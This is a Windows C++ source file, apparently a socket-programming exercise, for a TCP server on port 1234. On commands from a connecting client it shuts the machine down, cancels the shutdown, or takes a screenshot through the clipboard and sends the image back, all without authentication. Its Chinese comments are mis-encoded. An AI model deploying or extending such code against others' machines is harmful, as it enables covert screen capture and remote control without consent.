// 1_05_Զ��(�����ƶ�).cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"


#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <WinSock2.h>
#pragma comment(lib,"ws2_32.lib")

#include <atlimage.h>
#include <fstream>
using namespace std;

/*
1. ��ʼ������		WSAStartup
2. �����׽���		socket
3. ��				bind
4. ����				listen
5. ����				accept
6. ��������			send
7. ��������			recv
8. �ر��׽���		closesock
9. ������			WSACleanup
*/

bool prtSc()
{
	//mouse_event()
	keybd_event(VK_SNAPSHOT, 0, KEYEVENTF_EXTENDEDKEY | 0, 0);
	Sleep(100);
	keybd_event(VK_SNAPSHOT, 0, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
	Sleep(1000);
	//��ȡ�������е�ͼ��
	OpenClipboard(NULL);
	HBITMAP bitmap = (HBITMAP)GetClipboardData(CF_BITMAP);
	if (bitmap != nullptr)
	{
		CImage image;
		image.Attach(bitmap);
		image.Save(_T("look over.jpg"));
		image.Detach();
		CloseClipboard();
		return true;
	}
	CloseClipboard();
	return false;
}
char * readPic(int & size)
{
	ifstream infile("look over.jpg", ios_base::binary);
	infile.seekg(0, ios::end);
	size = infile.tellg();
	infile.seekg(0, ios::beg);

	char * buf = new char[size];
	infile.read(buf, size);
	infile.close();
	return buf;
}
void doSomeThing(char * code, SOCKET sock)
{
	if (!strcmp(code, "shutdown"))
	{
		system("shutdown -s -t 60");
	}
	else if (!strcmp(code, "noshutdown"))
	{
		system("shutdown -a");
	}
	else if (!strcmp(code, "lookover"))
	{
		//����
		if (prtSc())
		{
			//���ͽ����ļ�
			int size;
			char * buf = readPic(size);
			send(sock, buf, size, 0);
			delete[]buf;
		}

	}

}

int main()
{
	//1.��ʼ��winsock����
	WSADATA wsd;
	WSAStartup(MAKEWORD(2, 2), &wsd);
	if (LOBYTE(wsd.wHighVersion) != 2 ||
		HIBYTE(wsd.wHighVersion) != 2)
	{
		return -1;
	}

	//2. �����׽��֣�socket��
	SOCKET listenSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (listenSock == INVALID_SOCKET)
	{
		goto Err;
	}
	//3. �󶨼����׽���
	sockaddr_in servAddr;
	servAddr.sin_family = AF_INET;
	servAddr.sin_port = htons((short)1234);
	servAddr.sin_addr.S_un.S_addr = inet_addr("192.168.1.97"); //�ǵðѵ�ַ�޸ĳ��Լ���IP

	int retVal = bind(listenSock, (sockaddr *)&servAddr, sizeof(sockaddr));
	if (retVal == SOCKET_ERROR)
	{
		goto Err;
	}

	//4.��ʼ����
	retVal = listen(listenSock, SOMAXCONN);
	if (retVal == SOCKET_ERROR)
	{
		goto Err;
	}
	//5. ��������
	sockaddr_in clientAddr;
	int size = sizeof(sockaddr);
	SOCKET sToClientSock = accept(listenSock, (sockaddr *)&clientAddr, &size);
	if (sToClientSock == INVALID_SOCKET)
	{

		goto Err;
	}

	//6. ������
	//char buf[] = { "��ӭ���ӣ�" };
	//retVal = send(sToClientSock, buf, sizeof(buf), 0);
	//if (retVal == SOCKET_ERROR)
	//{
	//	goto OVER;
	//}

	//7. ������
	char recvBuf[1024] = { 0 };
	while (true)
	{
		ZeroMemory(recvBuf, 1024);
		retVal = recv(sToClientSock, recvBuf, 1024, 0);
		if (retVal == SOCKET_ERROR)
		{
			goto Err;
		}
		else if (!strcmp(recvBuf, "quit"))
		{
			break;
		}
		else
		{
			printf("%s \n", recvBuf);
			doSomeThing(recvBuf, sToClientSock);
		}

	}
Err:
	//8. �ر��׽���
	closesocket(sToClientSock);
	closesocket(listenSock);
	//9. ������
	WSACleanup();
	return 0;
}


